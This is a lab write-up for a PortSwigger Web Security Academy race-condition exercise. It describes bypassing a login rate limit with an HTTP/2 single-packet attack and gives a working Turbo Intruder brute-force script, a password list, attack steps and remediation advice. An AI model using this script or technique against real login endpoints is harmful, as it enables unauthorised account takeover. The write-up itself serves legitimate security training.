---
title: "Bypassing Rate Limits via Race Conditions"
platform: "PortSwigger"
category: "Race Conditions"
difficulty: "Apprentice"
date: 2026-02-15
techniques: ["TOCTOU", "Brute-Force", "Single-Packet Attack"]
description: "Single-packet HTTP/2 race condition bypassing login rate limits, 30 password attempts slip through the TOCTOU check before any counter increments."
lang: en
translation_key: race-condition-bypassing-rate-limits
---

## Platform
PortSwigger Web Security Academy

## Category
Race Conditions

## Difficulty
Apprentice

## Objective
Bypass the login rate limiting mechanism using a race condition, brute-force the password for user `carlos`, access the admin panel, and delete the user carlos.

---

## Context

The lab implements rate limiting on the login endpoint to prevent brute-force attacks. After a certain number of failed login attempts, the account gets locked. However, the rate limiting mechanism has a TOCTOU vulnerability: it checks the attempt counter, processes the login, and then increments the counter. By sending all password attempts simultaneously in a single packet, multiple requests pass the rate limit check before the counter is updated.

---

## Reconnaissance

### Credentials
- **Test account:** wiener:peter
- **Target account:** carlos (password unknown)

### Key Endpoints

| Endpoint | Method | Purpose |
|---|---|---|
| `/login` | GET | Login page (contains CSRF token) |
| `/login` | POST | Submit login credentials |
| `/admin` | GET | Admin panel (requires admin login) |

### Password Wordlist (provided by lab)
```
123123, abc123, football, monkey, letmein, shadow, master, 666666, qwertyuiop, 123321, mustang, 123456, password, 12345678, qwerty, 123456789, 12345, 1234, 111111, 1234567, dragon, 1234567890, michael, x654321, superman, 1qaz2wsx, baseball, 7777777, 121212, 000000
```

### Request Analysis
Login request captured via Burp Proxy:

```http
POST /login HTTP/2
Host: 0a51003904b1e8e38133ac30004d009f.web-security-academy.net
Cookie: session=SkAqZxlHBfsLG7xd1DpCNdyDmvOx9Esp
Content-Type: application/x-www-form-urlencoded

csrf=LixGlQiW7qZcFjspcfcHC0xeI6U5EbJs&username=carlos&password=%s
```

### Observations
- Sending login attempts sequentially triggers rate limiting after a few failed attempts
- The rate limit check and increment are not atomic, classic TOCTOU vulnerability
- HTTP/2 single-packet attack can deliver all attempts before the counter increments

---

## Exploitation

### Vulnerable Flow (TOCTOU)
```
All 30 requests arrive simultaneously via single-packet attack:

Request 1 (password=123123):  CHECK rate limit → OK → process login → FAIL → increment counter
Request 2 (password=abc123):  CHECK rate limit → OK → process login → FAIL → increment counter
...
Request 28 (password=7777777): CHECK rate limit → OK → process login → SUCCESS → 302 redirect
...
                                                  ↑
                              All requests pass the CHECK before any increment completes
```

### Attack Steps

1. **Capture login request**, logged in as `wiener:peter` to capture `POST /login` in Burp HTTP History
2. **Send to Turbo Intruder**, right-click the POST /login → Extensions → Turbo Intruder → Send to Turbo Intruder
3. **Modify request**, changed `username=wiener` to `username=carlos` and `password=peter` to `password=%s`
4. **Configure Turbo Intruder script** for single-packet attack:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    passwords = ['123123','abc123','football','monkey','letmein','shadow','master','666666','qwertyuiop','123321','mustang','123456','password','12345678','qwerty','123456789','12345','1234','111111','1234567','dragon','1234567890','michael','x654321','superman','1qaz2wsx','baseball','7777777','121212','000000']

    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

5. **First attempt failed**, all responses returned 400 "Invalid CSRF token" because the session cookie and CSRF token from the initial capture had expired
6. **Second attempt**, refreshed the login page to get a new session cookie and CSRF token, updated the Turbo Intruder request, and re-ran the attack
7. **Analyzed results**, sorted by Status column:
   - 1 request returned **302** (redirect to /my-account) with payload `7777777`
   - Multiple requests returned **200** (failed login)
   - Multiple requests returned **400** (rate limit / CSRF errors)
8. **Cleared browser cookies**, the attack had invalidated the browser session
9. **Logged in as carlos**, used credentials `carlos:7777777`
10. **Accessed admin panel** and deleted user carlos

### Result
- **Password found:** 7777777
- **Time remaining:** 6:03 of 15:00 minutes
- **Lab status:** Solved

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Brute Force | T1110 |
| Defense Evasion | Exploitation for Defense Evasion | T1211 |
| Initial Access | Valid Accounts | T1078 |

### CWE
- **CWE-362:** Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
- **CWE-307:** Improper Restriction of Excessive Authentication Attempts

---

## Key Concepts Learned

| Concept | Description |
|---|---|
| Rate Limit Bypass via Race Condition | Sending all attempts simultaneously so they pass the rate check before the counter increments |
| Single-Packet Attack | HTTP/2 technique to deliver 30 requests in one TCP packet, eliminating network jitter |
| Turbo Intruder Gate Mechanism | `gate='race1'` holds all requests until `openGate('race1')` releases them simultaneously |
| CSRF Token Freshness | CSRF tokens are tied to sessions, expired sessions invalidate tokens, requiring fresh capture |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Community | Proxy, HTTP History |
| Turbo Intruder | Single-packet attack with password list for race condition brute force |
| Firefox (Kali) | Browser with proxy configured to 127.0.0.1:8080 |

---

## Commands & Techniques Cheatsheet

```
# Turbo Intruder — Race Condition Brute Force Flow
1. Capture POST /login in Proxy → HTTP History
2. Right-click → Extensions → Turbo Intruder → Send to Turbo Intruder
3. Change password value to %s (placeholder)
4. Use Engine.BURP2 with concurrentConnections=1 for single-packet attack
5. Queue all passwords with same gate
6. openGate() to release all simultaneously
7. Sort results by Status — 302 = successful login
8. If CSRF error: refresh login page, get new session + token, update request, retry
```

---

## Errors & Lessons Learned

1. **CSRF token expired**. First attack attempt returned "Invalid CSRF token" on all requests because the session from the initial capture had expired. Fix: always get a fresh session cookie and CSRF token immediately before launching the Turbo Intruder attack.
2. **Browser session invalidated**. After the attack, the browser couldn't login because cookies were stale. Fix: clear cookies (click padlock → Clear cookies and site data) before attempting browser login.
3. **Rate limit vs Race condition**. Sequential brute force gets blocked by rate limiting, but sending all attempts in parallel bypasses it because the counter hasn't incremented yet when the requests are processed.

---

## Remediation

To prevent this race condition in rate limiting:

- **Atomic counter increment:** Use database-level atomic operations (e.g., Redis INCR) to increment the attempt counter before processing the login, not after
- **Account lockout by flag:** Set a locked flag on the account record using SELECT FOR UPDATE before processing any login attempt
- **Token bucket with distributed lock:** Implement rate limiting at the infrastructure level (e.g., Redis-backed token bucket) that operates independently of the application logic

---

## Reflection

This lab demonstrates how race conditions can bypass security controls, not just business logic. Rate limiting is a critical defense against brute force attacks, but when the check-and-increment isn't atomic, an attacker can send all attempts simultaneously and bypass it entirely. The Turbo Intruder with Engine.BURP2 made this trivial, all 30 passwords were tested in a single packet, and the correct one was identified by its unique 302 status code. The CSRF token issue was a realistic complication that would also occur in real-world testing, always ensure fresh tokens before launching parallel attacks.
